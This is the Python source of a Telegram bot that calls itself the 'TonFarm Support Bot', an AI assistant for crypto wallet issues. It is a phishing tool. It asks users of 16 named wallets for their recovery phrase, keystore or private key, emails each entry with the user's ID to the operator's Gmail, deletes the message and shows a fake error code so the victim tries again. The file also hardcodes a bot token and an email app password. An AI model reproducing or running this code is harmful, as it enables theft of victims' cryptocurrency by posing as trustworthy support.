import smtplib
from email.mime.text import MIMEText
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# =========================
# BOT CONFIG
# =========================
BOT_TOKEN = "8309220077:AAHWnKbGoKoEXe9b3fo1izeIb0jHboT6wzc"
EMAIL_ADDRESS = "Victoralbs4050th@gmail.com"
EMAIL_PASSWORD = "pgpg dfst mhrz rohk"

# =========================
# ERROR CODES (Wallet Mapping)
# =========================
ERROR_CODES = {
    "TonKeeper": "SERVER-TNKP78",
    "MyTonWallet": "SERVER-MTW44",
    "TonHub": "SERVER-THB93",
    "DeWallet": "SERVER-DWL11",
    "Telegram Wallet": "SERVER-TGW22",
    "Bitget": "SERVER-BGT66",
    "Safepal": "SERVER-SFP77",
    "Trust Wallet": "SERVER-TWT55",
    "Metamask": "SERVER-MMSK88",
    "Wallet Connect": "SERVER-WLC99",
    "Ledger": "SERVER-LDG33",
    "BRD Wallet": "SERVER-BRD12",
    "Coinbase": "SERVER-CNB44",
    "Best Wallet": "SERVER-BST21",
    "Zedna Wallet": "SERVER-ZDN88",
    "OKX": "SERVER-OKX09",
}

# =========================
# RTL FORMATTER
# =========================
def rtl(text: str) -> str:
    """Ensures Persian (Farsi) text displays right-to-left in Telegram."""
    return f"\u202B{text}\u202C"

# =========================
# LANGUAGES
# =========================
LANGUAGES = {
    "en": {
        "name": "🇬🇧 English",
        "welcome": "🤖 Rules, tickets, rewards, in-game issues, and bugs\n\n"
                   "🤖 TonFarm Support Bot is a free online assistant available directly on Telegram. "
                   "Get help resolving wallet and transaction issues efficiently.\n\n"
                   "🤖 You will be chatting with an Artificial Intelligence Support Bot with zero human interference.",
        "main_menu": "Please select the service you need help with 👇",
        "menu_buttons": ["Migration", "Rectification", "Withdraw Issue", "Claim Reflection", "Assets Recovery", "Login Issue"],
        "connect_wallet": "🔗 Connect Wallet\nSelect your wallet to continue 👇",
        "secure_connection": "🔒 Secure Connection – {wallet}\n\nConnect using any option below 👇",
        "auth_buttons": ["Phrase", "Keystore", "Private Key", "Cancel"],
        "enter_input": "🔑 Please enter your {auth_type}:",
        "back_wallets": "🔙 Back to Wallets",
        "back_main": "🔙 Back to Main Menu"
    },
    "ru": {
        "name": "🇷🇺 Русский",
        "welcome": "🤖 Правила, билеты, награды, игровые проблемы и ошибки\n\n"
                   "🤖 TonFarm Support Bot — это бесплатный онлайн-помощник прямо в Telegram. "
                   "Получите помощь в решении проблем с кошельками и транзакциями.\n\n"
                   "🤖 Вы будете общаться с ботом искусственного интеллекта без вмешательства человека.",
        "main_menu": "Пожалуйста, выберите нужный сервис 👇",
        "menu_buttons": ["Миграция", "Исправление", "Проблема с выводом", "Отражение", "Восстановление активов", "Проблема с входом"],
        "connect_wallet": "🔗 Подключение кошелька\nВыберите свой кошелек 👇",
        "secure_connection": "🔒 Безопасное соединение – {wallet}\n\nПодключитесь с помощью одного из вариантов ниже 👇",
        "auth_buttons": ["Фраза", "Keystore", "Приватный ключ", "Отмена"],
        "enter_input": "🔑 Введите {auth_type}:",
        "back_wallets": "🔙 Назад к кошелькам",
        "back_main": "🔙 Назад в меню"
    },
    "de": {
        "name": "🇩🇪 Deutsch",
        "welcome": "🤖 Regeln, Tickets, Belohnungen, Spielprobleme und Bugs\n\n"
                   "🤖 TonFarm Support Bot ist ein kostenloser Online-Assistent direkt auf Telegram. "
                   "Erhalten Sie Hilfe bei Wallet- und Transaktionsproblemen.\n\n"
                   "🤖 Sie chatten mit einem KI-Support-Bot ohne menschliches Eingreifen.",
        "main_menu": "Bitte wählen Sie den gewünschten Service 👇",
        "menu_buttons": ["Migration", "Berichtigung", "Auszahlungsproblem", "Reflexion beanspruchen", "Vermögenswiederherstellung", "Login Problem"],
        "connect_wallet": "🔗 Wallet verbinden\nWählen Sie Ihr Wallet 👇",
        "secure_connection": "🔒 Sichere Verbindung – {wallet}\n\nVerbinden Sie sich mit einer der folgenden Optionen 👇",
        "auth_buttons": ["Phrase", "Keystore", "Privater Schlüssel", "Abbrechen"],
        "enter_input": "🔑 Bitte geben Sie Ihre {auth_type} ein:",
        "back_wallets": "🔙 Zurück zu Wallets",
        "back_main": "🔙 Zurück zum Hauptmenü"
    },
    "es": {
        "name": "🇪🇸 Español",
        "welcome": "🤖 Reglas, tickets, recompensas, problemas y errores\n\n"
                   "🤖 TonFarm Support Bot es un asistente gratuito disponible en Telegram. "
                   "Obtén ayuda para resolver problemas de billetera y transacciones.\n\n"
                   "🤖 Estarás chateando con un Bot de Soporte de Inteligencia Artificial sin intervención humana.",
        "main_menu": "Por favor, seleccione el servicio que necesita 👇",
        "menu_buttons": ["Migración", "Rectificación", "Problema de retiro", "Reclamar reflexión", "Recuperación de activos", "Problema de inicio de sesión"],
        "connect_wallet": "🔗 Conectar billetera\nSeleccione su billetera 👇",
        "secure_connection": "🔒 Conexión segura – {wallet}\n\nConéctese utilizando una de las siguientes opciones 👇",
        "auth_buttons": ["Frase", "Keystore", "Clave privada", "Cancelar"],
        "enter_input": "🔑 Por favor, ingrese su {auth_type}:",
        "back_wallets": "🔙 Volver a Billeteras",
        "back_main": "🔙 Volver al Menú Principal"
    },
    "fa": {
        "name": "🇮🇷 فارسی",
        "welcome": rtl("🤖 قوانین، تیکت‌ها، پاداش‌ها، مشکلات و خطاهای بازی\n\n"
                       "🤖 ربات پشتیبانی TonFarm یک دستیار رایگان آنلاین در تلگرام است. "
                       "برای حل مشکلات کیف پول و تراکنش‌های خود به‌صورت سریع کمک بگیرید.\n\n"
                       "🤖 شما با یک ربات پشتیبانی هوش مصنوعی چت خواهید کرد بدون هیچ دخالت انسانی."),
        "main_menu": rtl("لطفاً سرویس مورد نظر خود را انتخاب کنید 👇"),
        "menu_buttons": ["مهاجرت", "اصلاح", "مشکل برداشت", "درخواست بازتاب", "بازیابی دارایی‌ها", "مشکل ورود"],
        "connect_wallet": rtl("🔗 اتصال کیف پول\nکیف پول خود را انتخاب کنید 👇"),
        "secure_connection": rtl("🔒 اتصال امن – {wallet}\n\nبا یکی از گزینه‌های زیر متصل شوید 👇"),
        "auth_buttons": ["عبارت بازیابی", "Keystore", "کلید خصوصی", "لغو"],
        "enter_input": rtl("🔑 لطفاً {auth_type} خود را وارد کنید:"),
        "back_wallets": rtl("🔙 بازگشت به کیف پول‌ها"),
        "back_main": rtl("🔙 بازگشت به منوی اصلی")
    },
}

# =========================
# START / LANGUAGE SELECTION
# =========================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton(LANGUAGES[code]["name"], callback_data=f"lang_{code}")]
                for code in LANGUAGES]
    await update.message.reply_text(
        "🌐 Please select your language / Пожалуйста, выберите язык / Wählen Sie Ihre Sprache / Seleccione su idioma / لطفاً زبان خود را انتخاب کنید 👇",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# =========================
# MAIN MENU
# =========================
async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    text = LANGUAGES[lang]["main_menu"]
    menu = LANGUAGES[lang]["menu_buttons"]

    keyboard = [[InlineKeyboardButton(btn, callback_data=cb)]
                for btn, cb in zip(menu, ["migration", "rectification", "withdraw", "reflection", "recovery", "login"])]
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))

# =========================
# WALLET LIST
# =========================
async def wallet_connection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    wallets = list(ERROR_CODES.keys())
    keyboard = [[InlineKeyboardButton(w, callback_data=f"wallet_{w}")] for w in wallets]
    await query.edit_message_text(LANGUAGES[lang]["connect_wallet"], reply_markup=InlineKeyboardMarkup(keyboard))

# =========================
# MANUAL CONNECTION
# =========================
async def manual_connect(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    wallet_name = query.data.replace("wallet_", "")
    context.user_data["selected_wallet"] = wallet_name
    buttons = LANGUAGES[lang]["auth_buttons"]

    keyboard = [[InlineKeyboardButton(btn, callback_data=f"auth_{btn.lower().replace(' ', '')}")] for btn in buttons]
    await query.edit_message_text(
        LANGUAGES[lang]["secure_connection"].format(wallet=wallet_name),
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

# =========================
# ASK FOR INPUT
# =========================
async def ask_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    lang = context.user_data.get("lang", "en")
    auth_type = query.data.replace("auth_", "")
    context.user_data["expecting_input"] = auth_type
    await query.message.reply_text(LANGUAGES[lang]["enter_input"].format(auth_type=auth_type))

# =========================
# HANDLE USER INPUT + DELETE MESSAGE + ERROR FEEDBACK
# =========================
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    state = context.user_data.get("expecting_input")
    wallet_name = context.user_data.get("selected_wallet", "Wallet")
    error_code = ERROR_CODES.get(wallet_name, "SERVER-UNKNOWN")
    lang = context.user_data.get("lang", "en")

    if state:
        user_input = update.message.text

        send_email(
            subject=f"TonFarm Support Bot Input from {wallet_name}",
            body=f"User ID: {update.effective_user.id}\n"
                 f"Username: @{update.effective_user.username}\n"
                 f"Wallet: {wallet_name}\n"
                 f"Auth Type: {state}\n\n"
                 f"Input:\n{user_input}"
        )

        try:
            await update.message.delete()
        except:
            pass

        keyboard = [
            [InlineKeyboardButton(LANGUAGES[lang]["back_wallets"], callback_data="connect_wallet")],
            [InlineKeyboardButton(LANGUAGES[lang]["back_main"], callback_data="main_menu")]
        ]

        await update.message.chat.send_message(
            f"‼ Error while connecting to {wallet_name}\n\n"
            f"⚠ {error_code} failed.\n\n"
            "👉 Please double-check your input and use copy-paste to avoid mistakes.",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )

        context.user_data.clear()
    else:
        await update.message.reply_text("ℹ Please choose an option first with /start.")

# =========================
# EMAIL FUNCTION
# =========================
def send_email(subject, body):
    msg = MIMEText(body)
    msg["Subject"] = subject
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = EMAIL_ADDRESS

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
        server.send_message(msg)

# =========================
# CALLBACK ROUTER
# =========================
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    data = query.data

    if data.startswith("lang_"):
        lang_code = data.split("_", 1)[1]
        context.user_data["lang"] = lang_code
        await query.edit_message_text(LANGUAGES[lang_code]["welcome"])
        keyboard = [[InlineKeyboardButton("Resolve Issues", callback_data="resolve_issues")]]
        await query.message.reply_text("👇", reply_markup=InlineKeyboardMarkup(keyboard))

    elif data == "resolve_issues":
        await main_menu(update, context)
    elif data in ["migration", "rectification", "withdraw", "reflection", "recovery", "login"]:
        await wallet_connection(update, context)
    elif data.startswith("wallet_"):
        await manual_connect(update, context)
    elif data.startswith("auth_"):
        await ask_for_input(update, context)
    elif data == "connect_wallet":
        await wallet_connection(update, context)
    elif data == "main_menu":
        await main_menu(update, context)

# =========================
# RUN BOT
# =========================
def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("🤖 TonFarm Support Bot running...")
    app.run_polling()

if _name_ == "_main_":
    main()
